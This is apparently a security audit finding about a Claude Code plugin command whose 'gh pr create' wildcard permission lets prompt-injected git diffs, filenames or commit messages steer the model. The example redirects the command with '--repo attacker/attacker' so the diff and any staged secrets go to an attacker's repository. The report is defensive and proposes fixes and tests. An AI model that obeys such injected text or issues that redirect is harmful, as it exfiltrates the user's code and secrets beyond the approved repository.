### Title
`Bash(gh pr create:*)` wildcard allows attacker-influenced flag injection (`--repo`/`--base`) to redirect the PR/diff to an untrusted remote - ([File: plugins/commit-commands/commands/commit-push-pr.md])

### Summary
The `/commit-push-pr` command's frontmatter grants `Bash(gh pr create:*)`, which by Claude Code's prefix+wildcard Bash-permission semantics pre-approves the literal prefix `gh pr create` followed by *any* additional arguments, including `--repo` and `--base` overrides. Because the command's context is built entirely from attacker-influenceable git state (`git status`, `git diff HEAD`, branch name), a poisoned diff/commit/filename can steer the model into emitting a `gh pr create --repo attacker/attacker ...` invocation that the wildcard rule auto-approves without any extra confirmation.

### Finding Description
The command declares: [1](#0-0) 
and its context block interpolates raw, attacker-influenceable git metadata (`git status`, `git diff HEAD`, branch name) directly into the model's prompt before it decides what `gh pr create` invocation to run.

The `allowed-tools` entry `Bash(gh pr create:*)` uses the standard `command:*` prefix-wildcard pattern; per the project's own permission-model changelog, this pattern matches the literal subcommand prefix and then allows an arbitrary trailing suffix (flags, values, redirections), as illustrated by entries such as "Bash permission rules now support output redirections when matching" and "wildcard pattern matching for Bash tool permissions using `*` at any position." Nothing in this frontmatter narrows the wildcard to disallow `--repo`/`--base`/`--head` overrides, so any suffix appended after `gh pr create` — including a fork/attacker-controlled destination — is pre-approved with no further prompt.

Separately, `plugins/security-guidance/hooks/security_reminder_hook.py` implements a defense-in-depth "push-sweep" that inspects `git push` invocations, but its own comments explicitly state that `gh pr create` is intentionally *not* separately gated because `gh` invokes `git push` as a child process that the top-level Bash matcher never observes, and that sessions relying purely on `gh pr create` (without ever issuing a standalone `git push`) are not caught by this mechanism: [2](#0-1) 

So there is no independent repo-scoping/allowlist check that verifies the `--repo`/`--base` target of a `gh pr create` call matches the originally-approved `origin` remote before the command executes.

### Impact Explanation
If repository content (a crafted diff hunk, filename, or commit message reachable by an unprivileged contributor) causes the model to append `--repo attacker/attacker` (or `--base` pointing at an attacker fork) to the otherwise-approved `gh pr create` call, the full local diff/commit content — potentially including inadvertently staged secrets — is sent to a PR opened against a remote outside the user's intended trust boundary, without any additional permission prompt. This matches the "networked tool use must stay bound to the user-approved target repo" invariant violation and results in diff/secret exfiltration to an attacker-controlled sink.

### Likelihood Explanation
Preconditions are modest: no privileged install rights are needed, only the ability to get attacker-controlled text into content the model reads while assembling the `gh pr create` invocation (e.g., diff content, filenames, or commit messages in a repo the victim later runs `/commit-push-pr` against). Because the wildcard is a straightforward `prefix + *` match with no flag-level scoping, and the security-guidance hook explicitly acknowledges it does not gate `gh pr create` destinations, the path is realistic and repeatable whenever prompt injection can influence the emitted command, though it does still depend on the model actually being steered to add the flag rather than a hard technical bypass of the matcher itself.

### Recommendation
Scope the `allowed-tools` rule (and the underlying Bash permission matcher) so that `gh pr create` wildcards do not implicitly authorize `--repo`, `--base`, `--head`, or other destination/remote-altering flags — require a separate explicit approval whenever `gh pr create` is invoked with a non-default target (i.e., anything other than the current `origin`-derived repo/base). Alternatively, wrap `gh pr create` in a vetted script (similar to `scripts/gh.sh`'s allowlisting pattern) that strips or rejects `--repo`/`--base` overrides and forces the target to the repo's own `origin`.

### Proof of Concept
Fuzz/invariant test plan:
1. Enumerate `gh pr create` argument permutations including `--repo owner/repo`, `--base branch --repo owner/repo`, `--repo=owner/repo`, and combinations with legitimate flags (`--title`, `--body`).
2. For each permutation, run it through the Claude Code Bash-permission matcher configured with rule `Bash(gh pr create:*)` and assert whether it is auto-approved.
3. Expected (failing) assertion today: all permutations, including those containing `--repo`/`--base` pointing to a non-default repo, are auto-approved by the wildcard.
4. Desired assertion after fix: only invocations targeting the session's bound/default repo (no `--repo`/`--base` override, or an override matching `origin`) are auto-approved; any other destination triggers a distinct "ask" permission decision.
5. Integration test: seed a repo diff containing an injected string designed to make the model draft `gh pr create --repo attacker/attacker ...`; run `/commit-push-pr` and assert the tool-call is blocked/prompted rather than silently executed.

### Citations

**File:** plugins/commit-commands/commands/commit-push-pr.md (L1-10)
```markdown
---
allowed-tools: Bash(git checkout --branch:*), Bash(git add:*), Bash(git status:*), Bash(git push:*), Bash(git commit:*), Bash(gh pr create:*)
description: Commit, push, and open a PR
---

## Context

- Current git status: !`git status`
- Current git diff (staged and unstaged changes): !`git diff HEAD`
- Current branch: !`git branch --show-current`
```

**File:** plugins/security-guidance/hooks/security_reminder_hook.py (L612-629)
```python
# ─── push-sweep ─────────────────────────────────────────────────────────────
#
# Mirrors Claude Code's own push-command matching — tolerates `git -C <p>` /
# `git -c k=v` global options. The hooks.json `Bash(git push:*)` matcher
# (subcommand prefix) doesn't, but those forms are rare in practice
# and the python only ever runs after CC's matcher fired, so this regex is a
# defensive re-gate, not a widening — `git -C path push` won't reach python
# unless chained with a plain `git push` in the same compound command.
#
# `gh pr create` is intentionally NOT a separate hooks.json matcher: gh runs
# `git push` as a child process, which CC's matcher doesn't observe (it sees
# only the top-level `gh pr create` argv). A separate `Bash(gh pr create:*)`
# entry would buy minimal extra coverage (sessions that push only via gh) at
# the cost of an extra python spawn on every `... && gh pr create` compound
# (the common case). Those sessions are caught on their next standalone `git push`.
_GIT_PUSH_RE = re.compile(
    r'\bgit(?:\s+-[cC]\s+\S+|\s+--\S+=\S+)*\s+push\b'
)
```
